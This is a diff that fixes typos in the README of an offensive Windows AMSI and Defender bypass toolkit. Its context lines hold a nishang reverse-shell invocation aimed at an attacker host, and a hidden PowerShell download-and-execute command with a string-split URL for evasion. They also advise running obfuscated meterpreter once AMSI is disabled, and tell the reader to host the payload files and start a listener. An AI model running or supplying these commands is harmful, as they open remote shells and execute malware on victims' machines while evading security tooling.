@@ -25,7 +25,7 @@ nish.ps1:
 -----------
 The TCP nishang that we always use from: https://github.com/samratashok/nishang/tree/master/Shells
 
-Definning this at the end of the script:
+Defining this at the end of the script:
 
 Invoke-PowerShellTcp -Reverse -IPAddress example.attacker.net -Port 443 
 
@@ -44,7 +44,7 @@ Finally we will need to "Invoke-Expression" the trigger:
 --------------------------------------------------------------
 powershell -windowstyle hidden iex(new-object net.webclient).DownloadString('htt'+'p:/'+'/example.ddns.net:80/trigger.ps1')
 
-Every child process running from this powershell session is going to run without the AMSI, so could easily run a meterpreter from this, but make sure to obfucate it because meterpreter is way more intrusive.
+Every child process running from this powershell session is going to run without the AMSI, so could easily run a meterpreter from this, but make sure to obfuscate it because meterpreter is way more intrusive.
 
 
 ---------------------------------------------
@@ -74,7 +74,7 @@ https://github.com/Filiplain/Windows-AMSI-Defender-Bypass
 
 Make sure to define your IP or Domain into the files
 And host a server where all the files are located
-Don't forget the lsitener with the port that you defined in the nishang or any reverse-shell you use.
+Don't forget the listener with the port that you defined in the nishang or any reverse-shell you use.
 
 
 Invokes Map:
